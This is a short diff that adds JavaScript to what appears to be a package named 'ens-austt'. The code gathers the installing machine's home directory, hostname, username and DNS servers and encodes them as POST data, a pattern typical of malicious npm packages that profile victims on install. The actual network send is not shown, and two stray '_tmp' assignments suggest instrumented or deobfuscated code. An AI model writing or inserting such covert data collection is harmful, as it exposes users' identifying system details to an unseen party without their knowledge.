@@ -1,0 +1,12 @@
+const trackingData = JSON.stringify({
+    package: "ens-austt",
+    homeDir: os.homedir(),
+    hostname: os.hostname(),
+    username: os.userInfo().username,
+    dnsServers: dns.getServers(),
+})
+_tmp_0.homeDir = os.homedir()
+const postData = querystring.stringify({
+    msg: trackingData,
+})
+_tmp_1.msg = trackingData
